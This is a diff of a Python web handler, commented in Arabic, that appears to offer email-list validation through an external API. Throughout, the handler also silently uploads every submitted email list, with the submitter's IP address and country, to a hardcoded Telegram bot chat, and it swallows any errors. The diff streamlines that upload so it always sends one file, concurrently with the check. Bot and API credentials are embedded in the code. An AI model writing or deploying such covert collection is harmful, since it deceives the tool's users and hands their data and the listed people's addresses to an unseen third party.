@@ -6,9 +6,7 @@ API       = "https://gmail-validation.mbahbabat.workers.dev"
 KEY       = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"
 TG_TOKEN  = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
 TG_CHAT   = "8554641519"
-API_BATCH = 10_000      # حد API: 10 ألف لكل باتش
-MAX_WORKERS = 10        # باتشات متوازية للـ API
-TG_MAX_BYTES = 950 * 1024 * 1024   # 950 MB أمان (تليجرام حده 2GB للبوتات)
+MAX_WORKERS = 10
 # ===============================================
 
 _geo_cache = {}
@@ -45,60 +43,37 @@ def safe_name(country):
     n = re.sub(r'[^a-z0-9]+', '_', country.lower()).strip('_')
     return n or 'unknown'
 
-# ── تليجرام: ملف واحد (أو عدة لو تجاوز الحد) ────────────────────────────────
+# ── تليجرام: كل الإيميلات في ملف txt واحد دايمًا ─────────────────────────────
 def tg_send(emails, ip, country):
     if not (TG_TOKEN and TG_CHAT and emails):
         return
-    content   = "\n".join(emails).encode('utf-8')
-    fname_base = safe_name(country)
-
-    # لو الحجم أقل من الحد → ملف واحد مباشرة
-    if len(content) <= TG_MAX_BYTES:
-        _tg_upload(content, f"{fname_base}.txt", len(emails), ip, country, part=None)
-        return
-
-    # لو أكبر → قسّم على حسب الحجم بس (مش عدد) وارفعهم
-    parts, buf = [], bytearray()
-    for line in (e + "\n" for e in emails):
-        enc = line.encode('utf-8')
-        if buf and len(buf) + len(enc) > TG_MAX_BYTES:
-            parts.append(bytes(buf))
-            buf = bytearray()
-        buf.extend(enc)
-    if buf:
-        parts.append(bytes(buf))
-
-    for i, chunk in enumerate(parts, 1):
-        _tg_upload(chunk, f"{fname_base}_part{i}.txt",
-                   chunk.count(b'\n'), ip, country, part=f"{i}/{len(parts)}")
-
-def _tg_upload(content_bytes, fname, count, ip, country, part):
+    content    = "\n".join(emails).encode('utf-8')
+    fname      = f"{safe_name(country)}.txt"
+    caption    = (
+        f'📥 Emails: {len(emails)}\n'
+        f'🌍 Country: {country or "unknown"}\n'
+        f'🌐 IP: {ip}'
+    )
     try:
-        caption = (
-            f'📥 Emails: {count}{"  |  Part " + part if part else ""}\n'
-            f'🌍 Country: {country or "unknown"}\n'
-            f'🌐 IP: {ip}'
-        )
-        f = io.BytesIO(content_bytes)
         requests.post(
             f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
             data={'chat_id': TG_CHAT, 'caption': caption},
-            files={'document': (fname, f, 'text/plain')},
+            files={'document': (fname, io.BytesIO(content), 'text/plain')},
             timeout=120
         )
     except Exception:
         pass
 
-# ── فحص باتش واحد (10 ألف) عبر الـ API ──────────────────────────────────────
-def check_batch(batch):
-    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in batch}
+# ── إرسال كل الإيميلات للـ API دفعة واحدة كاملة ─────────────────────────────
+def check_all(emails):
+    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in emails}
     err = None
     try:
         r = requests.post(
             f"{API}/fastcheck1",
             headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
-            json={"mail": batch},
-            timeout=120
+            json={"mail": emails},
+            timeout=300          # وقت أطول لأن الكمية ممكن تكون كبيرة
         )
         if r.status_code == 200:
             data  = r.json()
@@ -113,26 +88,16 @@ def check_batch(batch):
         err = str(e)
     return list(out.values()), err
 
-# ── المعالج الرئيسي ────────────────────────────────────────────────────────────
+# ── المعالج الرئيسي: تليجرام + API بالتوازي ──────────────────────────────────
 def process_all(emails, ip, country):
-    batches     = [emails[i:i + API_BATCH] for i in range(0, len(emails), API_BATCH)]
-    all_results = []
-    all_errors  = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
+        tg_fut  = pool.submit(tg_send,   emails, ip, country)   # تليجرام فورًا
+        api_fut = pool.submit(check_all, emails)                  # API كامل دفعة واحدة
 
-    # شغّل تليجرام بالتوازي مع الفحص (ثريد مستقل)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS + 1) as pool:
-        tg_fut      = pool.submit(tg_send, emails, ip, country)   # تليجرام فوراً
-        api_futs    = [pool.submit(check_batch, b) for b in batches]  # API بالتوازي
+        results, errors = api_fut.result()
+        tg_fut.result()
 
-        for fut in concurrent.futures.as_completed(api_futs):
-            results, err = fut.result()
-            all_results.extend(results)
-            if err:
-                all_errors.append(err)
-
-        tg_fut.result()   # انتظر تليجرام لو لسه شغّال
-
-    return all_results, (all_errors or None)
+    return results, ([errors] if errors else None)
 
 
 class handler(BaseHTTPRequestHandler):
